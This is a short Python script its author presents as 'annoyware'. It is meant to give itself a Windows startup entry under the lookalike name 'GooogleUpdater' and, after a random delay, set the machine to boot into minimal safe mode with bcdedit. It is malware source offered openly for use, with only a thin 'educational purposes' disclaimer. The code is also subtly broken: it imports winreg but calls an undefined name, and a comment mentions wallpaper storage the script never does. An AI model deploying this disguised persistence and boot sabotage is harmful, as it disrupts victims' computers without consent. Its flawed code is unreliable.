"""
DISCLAIMER: ***FOR EDUCATIONAL PURPOSES ONLY. I AM NOT RESPONSIBLE FOR ANY DAMAGES YOU MAY CAUSE WITH THIS.***


Author: Abhishek Iyengar
GitHub: https://github.com/tinshade
Description: This is a small python script that will randomly boot the windows machine into safemode.
While a safe-mode can have 3 vairants, this one uses the basic variant that does not allow for networking or CMD
operations.
I made this as an annoyware but it is fairly simple to remove once you are in the safe-mode. If you know what you're
doing, that is.

"""


import os
import time
import random
import winreg
import sys

userPath = os.path.join(os.path.expandvars("%userprofile%"),"GooogleUpdater") #Setting custom path to a folder in User's folder
def addStartup():
	if os.path.exists(userPath) == True:
		pass #Already added to registry
	else:
		os.mkdir(userPath) #Creating the directory for future checking and wallpaper storage
		fp = os.path.dirname(os.path.realpath(__file__)) #Getting the real path to the current script
		file_name = sys.argv[0].split('\\')[-1] #Formatting the path to get the filename
		new_file_path = fp + '\\' + file_name #Generating new file path
		keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run' #2nd half of registry key in Registry Editor (Can be changed to RunOnce)
		key2change = reg.OpenKey(reg.HKEY_CURRENT_USER, keyVal, 0, reg.KEY_ALL_ACCESS) #Adding keys with 1st and 2nd halves of the registry
		reg.SetValueEx(key2change, 'GooogleUpdater', 0, reg.REG_SZ,new_file_path) #Setting path in the registry and finishing the addition

def main():
	#Add to start up if not already
	if not os.path.isfile(userPath+"\\inf.ini"):
		addStartup()
		with open(userPath+"\\inf.ini",'w+') as f:
			f.write("Did I annoy you?")
			f.close()
	#Main Script
	randomIllusion = random.randint(1,500) #Get a random breathing time
	time.sleep(randomIllusion*60) #Waiting for the time in minutes
	os.system('bcdedit /set {default} safeboot minimal') #Rebooting in safe mode

main()
